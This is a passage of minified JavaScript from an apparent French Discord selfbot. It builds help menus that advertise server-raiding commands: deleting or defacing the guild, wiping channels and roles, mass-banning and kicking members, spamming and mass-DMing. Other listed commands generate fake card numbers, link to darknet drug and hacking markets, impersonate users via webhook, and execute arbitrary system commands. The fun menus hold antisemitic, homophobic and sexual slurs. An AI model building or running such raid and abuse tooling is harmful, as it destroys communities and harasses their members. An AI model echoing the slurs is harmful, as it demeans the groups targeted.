                            var cq = new aw.RichEmbed().setTitle('** 「MENU STATUS」 **').setDescription('').addField('```𝗚𝗮𝗺𝗲𝗽𝗲𝗿𝘀𝗼 + {msg}```', '***Autre status perso (Riche présence)***').addField('```𝗰𝘂𝘀𝘁𝗼𝗺 + {msg}```', '***status perso***').addField('```𝗿𝗽𝗰```', '***Riche présence custom*** ' + cj).addField('```𝗿𝗽𝗰𝗳𝗿𝗲𝗲```', '***Riche présence custom free***').addField('```𝗗𝗲𝗳𝗮𝘂𝘁```', '***status par Défaut***').addField('```𝗦𝘁𝗿𝗲𝗮𝗺 + {msg}```', '***Active ton status en*** **Streaming**').addField('```𝗠𝘂𝗹𝘁𝗶𝗦𝘁𝗿𝗲𝗮𝗺```', '***Active plusieurs stream*** ' + cj).addField('```𝗦𝗽𝗼𝘁𝗶𝗳𝘆 + {msg}```', '***Active ton status en*** **Spotify** ' + cj).addField('```𝗠𝘂𝘀𝗶𝗰 + {msg}```', '***Active ton status en*** **Ecoute de la Music**').addField('```𝗣𝗹𝗮𝘆 + {msg}```', '***Active ton status en*** **Playing**').addField('```𝗟𝗼𝗼𝗸 + {msg}```', '***Active ton status en*** **Watching**').addField('```𝗼𝗻𝗹𝗶𝗻𝗲```', '***Active ton status en ligne***').addField('```𝗶𝗱𝗹𝗲```', '***Active ton status en inactif***').addField('```𝗱𝗻𝗱```', '***Active ton status en ne pas déranger***').addField('```𝗶𝗻𝘃𝗶𝘀𝗶𝗯𝗹𝗲```', '***Active ton status en invisible***').addField('```𝗱𝗲𝗲𝘇𝗲𝗿𝘀 + {msg}```', '***Active ton status en deezers***').addField('```github + {msg}```', '***Active ton status en github***').addField('```𝗬𝘁𝗯 + {msg}```', '***Active ton status en YouTube*** ' + cj).addField('```𝗧𝘄𝗶𝘁𝘁𝗲𝗿 + {msg}```', '***Active ton status en Twitter*** ' + cj).addField('```𝗦𝗽𝗼𝗿𝗻𝗵𝘂𝗯 + {msg}```', '***Active ton status en pornhub***').addField('```𝗱𝗲𝗹𝗮𝗰𝘁```', '***Reset ton profil***').setImage(bm).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content === ab + 'raid') {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setTitle('** 「MENU RAID」 **').setDescription('').addField('```𝗦𝗲𝗿𝘃𝗲𝗿𝗶𝗻𝗳𝗼```', '***Affiche les infos du serveur actuel***').addField('```𝗶𝗻𝗳𝗼𝗽𝗹𝘂𝘀```', '***Affiche plus d\'infos du serveur actuel***').addField('```𝗚𝘂𝗶𝗹𝗱𝗱𝗲𝗹𝗲𝘁𝗲```', '***supprime le serveur ou avez fait la commande*** ' + cj).addField('```𝗖𝗵𝗮𝗻𝗻𝗲𝗹𝗶𝗻𝗳𝗼```', '***Affiche les infos des channel et category***').addField('```𝗦𝙥𝙖𝙢+[text]```', '***Spam un message*** ' + cj).addField('```𝗦𝙩𝙤𝙥𝙨𝙥𝙖𝙢```', '***Stop le spam*** ' + cj).addField('```𝗥𝗼𝗹𝗲𝗖𝗿𝗲𝗮𝘁𝗲```', '***créer des roles de toutes les couleurs***').addField('```𝗗𝗲𝘀𝘁𝗿𝗼𝘆```', '***detruit le serveur actuel***').addField('```𝗱𝗲𝗳𝗮𝗰𝗲```', '***Renomme le serveur, change la région et change la photo du serveur***').addField('```𝗰𝗵𝗮𝗻𝗴𝗲𝗶```', '***change l\'image du serveur actuel***').addField('```𝗰𝗵𝗮𝗻𝗴𝗲n```', '***change le nom du serveur actuel***').addField('```𝗗𝗲𝗹```', '***supprime tous les channel*** ' + cj).addField('```𝗗𝗲𝗹𝗿𝗼𝗹𝗲```', '***supprime tous les roles***').addField('```𝗿𝗲𝗻𝗮𝗺𝗲𝗮𝗹𝗹```', '***renommer tous les membres possible***').addField('```𝗔𝗹𝗹𝗕𝗮𝗻```', '***Bannir tous les membres possible*** ' + cj).addField('```𝗔𝗹𝗹𝗸𝗶𝗰𝗸```', '***Kick tous les membres possible*** ' + cj).addField('```𝗨𝗻𝗯𝗮𝗻𝗮𝗹𝗹```', '***débannir tous les membres du serveur actuel***').addField('```𝗿𝗲𝗻𝗮𝗺𝗲𝗰𝗵```', '***Renome tous les channels***').addField('```𝗺𝗽𝗮𝗹𝗹+[text]```', '***Envoie un message privé à tous les membres du serveur (à vos risques et periles)***').setImage(bm).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'fun')) {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            var cq = new aw.RichEmbed().setTitle('** 「MENU FUN 1」 **').setDescription('').addField('```𝗞𝗶𝘀𝘀```', '***Faire un Bisous***').addField('```𝗟𝗼𝘃𝗲```', '***Affiche une image Love***').addField('```𝗜𝘀𝘀𝗼𝘂```', '***issouflerie***').addField('```𝗕𝗹𝗰```', '***Je m\'en Bat Les Couilles***').addField('```𝗣𝗮𝘁𝗮𝘁𝗲```', '***Patate dans ta mère***').addField('```𝗞𝗮𝗿𝗺𝗮```', '***Affiche le Karma***').addField('```𝗦𝗮𝗱```', '***Je suis Triste***').addField('```𝗯𝗼𝗼𝗺```', '***t\'explose fdp***').addField('```𝗡𝗲𝗸𝗼```', '***Neko ❤️***').addField('```𝗧𝗴```', '***Tg fdp***').addField('```𝗗𝗲𝗮𝘁𝗵𝗻```', '***t\'es le prochain sur la liste***').addField('```𝗗𝗮𝗿𝗼𝗻𝗻𝗲𝗱```', '***daronned***').addField('```𝗥𝗮𝗻𝗱𝗼𝗺```', '***Affiche un nombre random***').addField('```𝗳𝗮𝗰𝗲𝗽𝗮𝗹𝗺```', '***facepalm***').addField('```𝗟𝗼𝗮𝗱```', '***fais un chargement***').addField('```𝗧𝗿𝗼𝗹𝗹```', '***troll ascii***').addField('```𝗕𝗶𝗳𝗳𝗹𝗲```', '***je te biffle salope***').addField('```𝗖𝗹𝗮𝗾𝘂𝗲𝘁𝘁𝗲𝘀```', '***t\'offre des claquettes***').addField('```𝗰𝗮𝗱𝗲𝗮𝘂```', '***un cadeau sauvage apparaît***').addField('```𝗵𝗼𝘁𝗱𝗼𝗴```', '***un hotdog sauvage apparaît***').addField('```𝗵𝟰𝘅𝟬𝗿```', '***h4x0r détecté***').addField('```𝗯𝗼𝗻𝘁𝗼𝘂𝘁𝗼𝘂```', '***bon toutou***').addField('```𝗰𝗮𝗹𝗰𝘂𝗹```', '***résous le calcul***').addField('```𝟴𝗕𝗮𝗹𝗹```', '***Répond à ta question*** ' + cj).setImage(bm).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'fun')) {
                          if (cg.author.id === aN.user.id) {
                            var cq = new aw.RichEmbed().setTitle('** 「MENU FUN 2」 **').setDescription('').addField('```𝗛𝘂𝗴```', '***Faire un Câlin***').addField('```𝗦𝘂𝗶𝗰𝗶𝗱𝗲```', '***Kill Me***').addField('```𝗿𝗶𝗽```', '***repose en paix***').addField('```𝗯𝗼𝗼𝗺```', '***t\'explose fdp***').addField('```𝗩𝗲𝘀𝗸𝗶```', '***veski***').addField('```𝗝𝘂𝗶𝗳```', '***juif detecté***').addField('```𝘀𝘀𝗮𝘆𝗮𝗻```', '***super ssayan***').addField('```𝗼𝗺𝗴```', '***omg regarde moi ça***').addField('```𝗥𝗼𝘂𝘅```', '***mais tema la Geule du roux***').addField('```𝗰𝗮𝗹𝗰𝗴𝗮𝘆```', '***calcule si tu es pd***').addField('```𝗗𝗲́𝗯𝗶𝘁𝗮𝗴𝗲 ```', '***je débite aussi vite que tu suces des bites***').addField('```𝗙𝗱𝗽 ```', '***jvétniker fdp***').addField('```𝗺𝗲𝗺𝗲```', '***génère un meme***').addField('```𝗯𝘁𝗰 ```', '***Affiche la courbe du bitcoincoin***').addField('```𝗘𝘁𝗵 ```', '***Affiche la courbe Ethereum***').addField('```𝗟𝘁𝗰 ```', '***Affiche la courbe LTC***').addField('```𝘁𝗼𝗱𝗮𝘆 ```', '***Check si on est mardi***').addField('```𝗚𝗿𝗮𝗳𝗳 + {msg}```', '***Génère un graffity avec le texte*** ' + cj).addField('```𝗡𝗲𝗼𝗻 + {msg}```', '***Génère une image neon avec le texte*** ' + cj).addField('```𝗕𝗲𝗮𝗰𝗵 + {msg}```', '***Génère une image beach avec le texte*** ' + cj).addField('```𝗡𝗲𝗼𝗻𝗲𝗳𝗳𝗲𝗰𝘁 + {msg}```', '***Génère une image neon sing avec le texte*** ' + cj).addField('```𝗡𝗼𝗲𝗹 + {msg}```', '***Génère une image de noel avec le texte*** ' + cj).addField('```𝗕𝗹𝗼𝗼𝗱 + {msg}```', '***Génère une image avec le texte écris en sang*** ' + cj).addField('```𝗟𝗶𝗴𝗵𝘁 + {msg}```', '***Génère une image light avec le texte*** ' + cj).addField('```𝗥𝗲𝘁𝗿𝗼 + {msg}```', '***Génère une image RETRO avec le texte*** ' + cj).setImage(bm).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'fun')) {
                          if (cg.author.id === aN.user.id) {
                            var cq = new aw.RichEmbed().setTitle('** 「MENU FUN 3」 **').setDescription('').addField('```𝗣𝗳```', '***Pile ou Face***').addField('```𝗥𝗮𝗻𝗱𝗼𝗺𝗰𝗮𝗿𝗱```', '***Choisis un carte (Ace,Rois...)***').addField('```𝗼𝗽𝗶𝗻𝗶𝗼𝗻```', '***Répond à ton opinion***').addField('```𝗰𝗮𝘁```', '***image de chat***').addField('```𝗱𝗼𝗴𝘀```', '***image de chiens***').addField('```𝗯𝗶𝗿𝗱```', '***image d\'oiseaux***').addField('```𝗮𝗿𝗼𝘂𝗳```', '***Arouf partout même dans ton trou***').addField('```𝗮𝗿𝗼𝘂𝗳𝘃𝗶𝗱𝗲𝗼```', '***Arouf partout même dans ton trou***').addField('```𝗰𝗵𝗼𝗺𝗲𝘂𝗿 ```', '***Trouve toi une passion sale chômeur***').addField('```𝗰𝗼𝗻```', '***t con -_-***').addField('```𝗰𝗵𝗼𝗾𝘂𝗲𝗿 ```', '***choquer***').addField('```𝗿𝗮𝗰𝗶𝘀𝗺𝗲```', '***Vive l\'humour noir :)***').addField('```𝗰𝗼𝗿𝗼𝗻𝗮```', '***Avez vous une chance de survivre au coronavirus ???***').addField('```𝗴𝘁𝘄𝗶𝘁𝘁𝗲𝗿```', '***Génère un pseudo twitter***').addField('```𝘁𝘄𝗲𝗲𝘁 + {pseudo} + {msg}```', '***Génère tweet***').addField('```𝗽𝗵𝗰𝗼𝗺𝗺𝗲𝗻𝘁 + {mention} + {msg}```', '***Génère un commentaire sur pornhub avec l\'utilisateur mentionnée*** ' + cj).addField('```𝗺𝗮𝗴𝗶𝗸 + {intencity}```', '***Génère une image wtf intencitée (0 à 10)***').addField('```𝗷𝗽𝗲𝗴```', '***Génère une image avec ta pdp (pixelisée)***').addField('```𝗰𝗵𝗮𝗻𝗴𝗲𝗺𝗶𝗻𝗱 + {msg}```', '***Changemind***').addField('```𝗰𝗹𝘆𝗱𝗲 + {msg}```', '***Envoi un message de Clyde***').addField('```𝗯𝗮𝗴𝘂𝗲𝘁𝘁𝗲```', '***Mange du pain***').addField('```𝘁𝗵𝗿𝗲𝗮𝘁𝘀```', '***Génère une image threats***').addField('```𝗶𝗺𝗮𝗴𝗲𝗰𝗮𝗽𝘁𝗰𝗵𝗮```', '***Génère un captcha avec ta pdp*** ' + cj).addField('```𝘁𝗿𝘂𝗺𝗽𝘁𝘄𝗲𝗲𝘁 + {msg}```', '***Génère un tweet de trump*** ' + cj).addField('```𝗶𝗽𝗵𝗼𝗻𝗲𝘅```', '***Génère un iphone X***').setImage(bm).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'fun')) {
                          if (cg.author.id === aN.user.id) {
                            var cq = new aw.RichEmbed().setTitle('** 「MENU FUN 4」 **').setDescription('').addField('```𝗪𝗮𝘀𝘁𝗲𝗱 + {mention}```', '***WASTED***').addField('```𝗧𝗿𝗶𝗴𝗴𝗲𝗿𝗲𝗱 + {mention}```', '***TRRRRIIIIIGGGGRRREEEDDD!!!!!!!!!!!!***').addField('```𝗚𝗮𝘆 + {mention}```', '***Met la pp de l\'utilisateur mentionné avec le drapeau des pd.***').addField('```𝗚𝗿𝗲𝘆𝘀𝗰𝗮𝗹𝗲 + {mention}```', '***Met la pp de l\'utilisateur mentionné en noir et blanc.***').addField('```𝗜𝗻𝘃𝗲𝗿𝘁 + {mention}```', '***Inverser les couleurs de la pp de l\'utilisateur mentionné.*** ' + cj).addField('```𝗣𝗮𝗻𝗱𝗮 𝗿𝗼𝘂𝘅```', '***Image de panda roux***').addField('```𝗣𝗮𝗻𝗱𝗮```', '***Image de panda***').addField('```𝗪𝗶𝗻𝗸 + {mention}```', '***Bien gamin***').addField('```𝗙𝗼𝘅```', '***Image de renard***').addField('```𝗸𝗼𝗮𝗹𝗮```', '***Image de koala***').addField('```𝗣𝗶𝗸𝗮𝗰𝗵𝘂```', '***Image de pikachu***').addField('```𝗣𝗼𝗸𝗲𝗱𝗲𝘅 + {pokemon}```', '***Affiche toutes les infos d\'un pokemon***').addField('```𝗣𝗲𝗰𝗵𝗼```', '***Pecho vite fais bien fais***').addField('```𝗥𝘂𝘀𝘀𝗶𝗮𝗻𝗿𝗼𝘂𝗹𝗲𝘁𝘁𝗲```', '***jou à la roulette russe***').addField('```𝗖𝗵𝗮𝘁𝗯𝗼𝘁 + {msg}```', '***Parle avec le punchnox project*** ' + cj).addField('```𝗰𝗮𝗹𝗺𝗲```', '***Calme***').addField('```𝗙𝗶𝘀𝗵```', '***Peche un poisson***').addField('```𝗰𝗮𝗽𝘁𝗰𝗵𝗮𝘃𝟮 + {msg}```', '***Génère un captcha***').addField('```𝘀𝗰𝗿𝗼𝗹𝗹 + {msg}```', '***Génère une image scroll***').addField('```𝗱é + {paris}```', '***Fais un Paris***').addField('```𝘀𝗮𝘁𝘂𝗿𝗮𝘁𝗶𝗼𝗻 + {mention}```', '***Génère une image saturée***').addField('```𝗰𝗼𝗺𝗺𝘂𝗻𝗶𝘀𝘁 + {mention}```', '***Génère une image de communist***').addField('```𝘀𝗻𝗼𝘄 + {mention}```', '***Que c\'est beaux***').addField('```𝗱𝗶𝗱𝘆𝗼𝘂𝗺𝗲𝗮𝗻 + {msg}```', '***did you mean*** ' + cj).addField('```𝘀𝘂𝗽𝗿𝗲𝗺 + {msg}```', '***Génère le logo suprem avec le text***').setImage(bm).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'fun')) {
                          if (cg.author.id === aN.user.id) {
                            var cq = new aw.RichEmbed().setTitle('** 「MENU FUN 5」 **').setDescription('').addField('```𝗿𝗮𝗻𝗱𝗼𝗺𝗻𝗮𝗺𝗲```', '***gen un pseudo random*** ' + cj).addField('```𝗱𝗿𝗮𝗸𝗲```', '***drake meme***').addField('```𝗽𝗵𝗹𝗼𝗴𝗼 + {msg}```', '***Génère le logo pornhub avec le text choisis***').addField('```𝗮𝘄𝗼𝗼𝗶𝗳𝘆```', '***awooify***').addField('```𝘁𝗼𝗯𝗲𝗰𝗼𝗻𝘁𝗶𝗻𝘂𝗲𝗱```', '***Tobecontinued***').addField('```𝗽𝘀𝟰```', '***Génère un jeu ps4*** ' + cj).addField('```𝗰𝗵𝗮𝗹𝗹𝗲𝗻𝗴𝗲𝗿```', '***challenger***').addField('```Threshold```', '***jsp comment expliquer ça zebi***').addField('```𝗯𝗿𝗮𝘇𝘇𝗲𝗿𝘀```', '***Génère une affiche brazzers*** ' + cj).addField('```𝗯𝘂𝗿𝗻```', '***ça bruuuuule***').addField('```𝗯𝗲𝗮𝘂𝘁𝗶𝗳𝘂𝗹```', '***splendide***').addField('```𝗳𝗶𝗿𝗲```', '***Brule l\'utilisateur mentioné***').addField('```𝗰𝗿𝘂𝘀𝗵```', '***crush*** ' + cj).addField('```𝗲𝗺𝗯𝗼𝘀𝘀```', '***petite saturation***').addField('```𝗽𝗼𝘀𝘁𝗲𝗿𝗶𝘇𝗲```', '***posterize***').addField('```𝘄𝗮𝗻𝘁𝗲𝗱```', '***Tête mise à prix***').addField('```𝗸𝗮𝗻𝗻𝗮𝗴𝗲𝗻```', '***kannagen***').addField('```𝘀𝗲𝗻𝗱𝗻𝘂𝗱𝗲```', '***Send nude stp :)***').addField('```𝗲𝗺𝗼𝗷𝗶𝗿𝗮𝗻𝗱𝗼𝗺```', '***pleins d\'emojis aléatoire***').setImage(bm).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'tools')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setTitle('** 「MENU TOOLS」 **').setDescription('').addField('```𝗩𝗲𝗿𝗶𝗳```', '***Bienvenue sur le selfbot***').addField('```𝗨𝘀𝗲𝗿𝗜𝗻𝗳𝗼```', '***Affiche les infos sur la personne mentionner*** (sur serveur)').addField('```𝗨𝘀𝗲𝗿𝗣𝘃𝗜𝗻𝗳𝗼```', '***Affiche les infos en DM (Moins d\'infos)***').addField('```𝗴𝗲𝘁𝗶𝗱```', '***récupère l\'id de la personne mentionnée***').addField('```𝗣𝗶𝗻𝗴```', '***Affiche la latance du self***').addField('```𝗛𝗮𝘀𝘁```', '***créer un hastebins***').addField('```𝗧𝗶𝗺𝗲```', '***Affiche l\'heurs***').addField('```𝗪𝗮𝗿𝗻```', '***report la personne mentionnée*** ' + cj).addField('```𝗚𝗵𝗼𝘀𝘁𝗽𝗶𝗻𝗴```', '***fais un ghost ping***').addField('```𝗔𝘃𝗮𝘁𝗮𝗿```', '***Affiche l\'avatar de la personne mentionner***').addField('```𝙥𝙥 + {lien}```', '***Change t\'as pp par l\'image choisis*** ' + cj).addField('```𝗺𝘆𝘁𝗼𝗸𝗲𝗻```', '***montre ton token les logs (la console)***').addField('```𝗺𝘆𝗶𝗽```', '***montre ton ip les logs (la console)*** ' + cj).addField('```𝗺𝘆𝗵𝗼𝘀𝘁𝗻𝗮𝗺𝗲```', '***montre ton hostename les logs (la console)***').addField('```𝗻𝗲𝘄𝘁𝗼𝗸𝗲𝗻```', '***te créer un nouveau token sans changer ton mdp (relancer discord une fois la commande faite)*** ' + cj).addField('```𝘀𝗵𝘂𝘁𝗱𝗼𝘄𝗻```', '***étein le selfbot***').addField('```𝗿𝗲𝘀𝘁𝗮𝗿𝘁```', '***relance le selfbot***').addField('```𝗹𝗰𝗹𝗲𝗮𝗿```', '***clear les logs (de la console)***').addField('```𝗥𝗼𝗹𝗲𝗶𝗻𝗳𝗼```', '***Affiche les infos d\'un role***').addField('```𝗰𝗵𝗲𝗰𝗸𝗵𝗼𝘀𝘁```', '***flèmme d\'expliquer*** ' + cj).addField('```𝗨𝗽𝘁𝗶𝗺𝗲```', '***montre combien de temps vous avez passez sur le self***').addField('```𝗿𝗲𝘃𝗮𝘃 + {mention}```', '***fais une recherche avec la pdp de la personne mentionnée***').addField('```𝗲𝗺𝗯𝗲𝗱```', '***Fait un embed***').addField('```𝗦𝗼𝗻𝗱 + 𝘁𝗲𝘅𝘁𝗲```', '***Fait un sondage*** ' + cj).setImage(bm).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'tools')) {
                          if (cg.author.id === aN.user.id) {
                            var cq = new aw.RichEmbed().setTitle('** 「MENU UTILS (tools 2)」 **').setDescription('').addField('```𝗼𝘀𝘂 + {pseudo} ```', '***Affiche les stats osu***').addField('```𝗺𝗲𝘁𝗲𝗼 + {region ou ville} ```', '***Affiche la météo de la ville mentionnée***').addField('```𝗾𝗿𝗰𝗼𝗱𝗲 + {lien} ```', '***Créer un qrcode*** ' + cj).addField('```𝗶𝗻𝘃𝗶𝘁𝗲𝗯𝗼𝘁 + {mention}```', '***creer une invitations {bot}***').addField('```𝗚𝗼𝗼𝗴𝗹𝗲```', '***Fais une recherche sur google***').addField('```𝘀𝗲𝗮𝗿𝗰𝗵𝘀𝗽𝗼𝘁𝗶𝗳𝘆```', '***Fais une recherche sur spotify***').addField('```𝘀𝗶𝗻𝗴𝗼𝘀𝘂 ```', '***Fais une recherche sur osu***').addField('```𝗬𝗼𝘂𝘁𝘂𝗯𝗲```', '***Fais une recherche sur YouTube***').addField('```𝗘𝘅𝗲𝗰 + {commande}```', '***Exécute une commande Windows (star cmd...) ne pas faire si vous ne s\'avez pas ce que vous faites***').addField('```𝗲𝘃𝗮𝗹```', '***Exécute un scripte (Java, Javascripte, js...)***').addField('```𝗵𝘆𝗽𝗲𝘀𝗾𝘂𝗮𝗱 + {bravery,brilliance,balance ou random}```', '***Change votre hypesquad*** ' + cj).addField('```𝗺𝗶𝗻𝗲𝘀𝘄𝗲𝗲𝗽𝗲𝗿 + {10 10 10 (exemple)}```', '***joue au démineur***').addField('```𝗱𝗺 + {user} + {message} ```', '***envoi un message mp*** ' + cj).addField('```𝗳𝗶𝗿𝘀𝘁 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 ```', '***Montre le premier message du channel*** ' + cj).addField('```𝗲𝗻𝗰𝗼𝗱𝗲 + {text}```', '***Encode votre texte en base64***').addField('```𝗱𝗲𝗰𝗼𝗱𝗲 + {text}```', '***Decode votre texte en base64***').addField('```𝗰𝗮𝗰𝗵𝗲 + {text}```', '***Cache votre texte***').addField('```𝘁𝗶𝗻𝘆𝘂𝗿𝗹 + {url}```', '***raccourci l\'url avec tinyurl***').addField('```𝗲𝗺𝗽𝘁𝘆```', '***Envoie un message vide*** ' + cj).addField('```𝗲𝗺𝗼𝗷𝗶𝘀𝗹𝗶𝘀𝘁```', '***Affiche tous les emojis du serveur actuel***').addField('```𝗿𝗼𝗹𝗲𝗹𝗶𝘀𝘁```', '***Affiche tous les roles du serveur actuel***').setImage(bm).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'tools')) {
                          if (cg.author.id === aN.user.id) {
                            var cq = new aw.RichEmbed().setTitle('** 「MENU UTILS (tools 3)」 **').setDescription('').addField('```𝗯𝗶𝗻𝗮𝗶𝗿𝗲𝗲𝗻𝗰𝗼𝗱𝗲 + {msg}```', '***Encode en binaire*** ' + cj).addField('```𝗯𝗶𝗻𝗮𝗶𝗿𝗲𝗱𝗲𝗰𝗼𝗱𝗲 + {msg}```', '***Decode en binaire*** ' + cj).addField('```𝗻𝗽𝗺 + {module}```', '***Fais une recherche complète sur un module (npm)***').addField('```𝗱𝗲𝗳𝗮𝘂𝘁𝗮𝗹𝗹```', '***met tous les pseudos par défaut*** ' + cj).addField('```𝗦𝗲𝘁𝗮𝗳𝗸 + {raison} ```', '***Te met en afk***').addField('```𝗨𝗻𝗮𝗳𝗸```', '***Enleve le afk***').addField('```𝗠𝘆𝗽𝗿𝗲𝗺𝘀```', '***Affiche t\'es perms***').addField('```𝗠𝘆𝗻𝗶𝗰𝗸𝗻𝗮𝗺𝗲```', '***Met ton pseudo par défaut sur le serveur actuel***').addField('```𝗖𝗵𝗮𝗻𝗴𝗲𝗻𝗶𝗰𝗸 + {pseudo}```', '***Change ton pseudo sur le serveur actuel***').addField('```𝗦𝗲𝗮𝗿𝗰𝗵𝗺𝘂𝘀𝗶𝗰 + {musique}```', '***Fais une recherche sur une musique (auteur, titre, paroles...)***').addField('```𝗮𝗻𝗶𝗺𝗮𝗹```', '***Génère le nom d\'un animal random***').addField('```𝗻𝗮𝗺𝗲```', '***Génère un nom et un prénom***').addField('```𝗺𝗮𝘀𝘁𝗲𝗿𝗰𝗮𝗿𝗱```', '***Génère un faux code mastercard*** ' + cj).addField('```𝗛𝗶𝗱𝗱𝗲𝗻𝘄𝗶𝗸𝗶 𝗗𝗿𝘂𝗴𝘀```', '***Hiddenwiki drugs***').addField('```𝗛𝗶𝗱𝗱𝗲𝗻𝘄𝗶𝗸𝗶 𝗦𝗲𝗿𝘃𝗶𝗰𝗲𝘀```', '***Hiddenwiki Commercial Services***').addField('```𝗛𝗶𝗱𝗱𝗲𝗻𝘄𝗶𝗸𝗶 𝗙𝗼𝗿𝘂𝗺𝘀```', '***Hiddenwiki Forums and Chans***').addField('```𝗛𝗶𝗱𝗱𝗲𝗻𝘄𝗶𝗸𝗶 𝗛𝗮𝗰𝗸𝗶𝗻𝗴```', '***Hiddenwiki Hacking and Warez***').addField('```𝗛𝗶𝗱𝗱𝗲𝗻𝘄𝗶𝗸𝗶 𝗙𝗶𝗻𝗮𝗻𝗰𝗶𝗮𝗹```', '***Hiddenwiki Marketplace Financial***').addField('```𝘄𝗮𝗹𝗹𝗽𝗮𝗽𝗲𝗿```', '***Random wallpaper***').addField('```𝘁𝗳𝗼𝗿𝘁𝗻𝗶𝘁𝗲 + {msg}```', '***Ecris votre texte avec la police de fortnite***').addField('```𝘀𝗮𝘆 + {mention} + {msg}```', '***Fais dire se que vous voulez à la personne de votre chois (perm webhook, que sur les serv)***').addField('```𝗿𝗼𝗯𝗽𝗽 + {mention}```', '***Vole la photo de profil de l\'utilisateur mentionné*** ' + cj).addField('```𝗽𝗽 + {lien}```', '***Change photo de profil de l\'utilisateur avec le lien***').setImage(bm).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'tools')) {
                          if (cg.author.id === aN.user.id) {
                            var cq = new aw.RichEmbed().setTitle('** 「MENU UTILS (tools 4)」 **').setDescription('').addField('```𝗴𝘂𝗶𝗹𝗱 𝗰𝗿𝗲𝗮𝘁𝗲```', '***Créer un serveur instant*** ' + cj).addField('```𝗳𝗮𝗿𝗺𝗲𝘅𝗽```', '***Farm de l\'xp (mee6...)*** ' + cj).addField('```𝘀𝘁𝗼𝗽𝗳𝗮𝗿𝗺𝗲𝘅𝗽```', '***stop le farm xp*** ' + cj).addField('```𝘁𝗿𝗮𝗱 + {langue} + {msg}```', '***Traduit le text mentionné avec la langue mentionné (fr, en, uk...)***').addField('```𝗶𝗻𝗳𝗼𝘆𝘁𝗯 + {id vidéo}```', '***Affiche les stats de la vidéo mentionnée***').addField('```𝗖𝘂𝗿𝗿𝗲𝗻𝗰𝘆```', '***Affiche combien 1 usd vaut en euro***').addField('```𝗔𝗹𝗹𝘂𝘀𝗱```', '***Affiche combien 1 usd vaut dans le monde (toutes les monnaies)***').addField('```𝗹𝗲𝗮𝘃𝗲```', '***Quitte le serveur actuel***').addField('```𝗰𝗵𝗮𝗻𝗻𝗲𝗹𝘃𝗶𝗲𝘄```', '***Affiche tous les channels du serveurs même ceux que tu ne vois pas***').addField('```gitinfos```', '***Affiche les informations github avec un username***').setImage(bm).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'mod')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setTitle('** 「MENU MODERATION」 **').setDescription('').addField('```𝗕𝗮𝗻```', '***Ban le personne mentionner***').addField('```𝗶𝗱𝗕𝗮𝗻```', '***Ban un utilisateur avec l\'id (vous pouvez ban même si la personne est pas sur le serveur actuel)*** ' + cj).addField('```𝗞𝗶𝗰𝗸```', '***Kick la personne mentionner***').addField('```𝗣𝘂𝗿𝗴𝗲```', '***Supprime tout les message (DM)***').addField('```𝗖𝗹𝗲𝗮𝗿```', '***Efface le nombre de message voulu (Serv)***').addField('```𝗔𝗻𝘁𝗶𝗿𝗮𝗶𝗱𝗼𝗻```', '***Active le mod raid (Serv)*** ' + cj).addField('```𝗔𝗻𝘁𝗶𝗿𝗮𝗶𝗱𝗼𝗳𝗳```', '***Désactive le mod raid (Serv)*** ' + cj).addField('```𝘄𝗮𝗿𝗻 + {mention}```', '***Warn la personne mentiennée (envoi un message en mp)*** ' + cj).addField('```𝗺𝘂𝘁𝗲 + {mention}```', '***Mute la personne mentiennée***').addField('```𝘂𝗻𝗺𝘂𝘁𝗲 + {mention}```', '***Unmute la personne mentiennée***').addField('```𝘀𝗼𝗳𝘁𝗯𝗮𝗻 + {mention}```', '***ban la personne mentionné temporairement***').addField('```𝗱𝗮𝘆𝘀𝗯𝗮𝗻 + {nombre de jours} + {mention}```', '***ban la personne mentionnée avec le nombre de concours choisis (exemple 2)***').setImage(bm).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        var cr = new aw.RichEmbed().setTitle('Nsfw désactivé').setDescription('***Le nsfw est actuellement désactivé si vous voulez l\'activer allez dans le config.js et suivez les instructions***').setTimestamp().setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL),
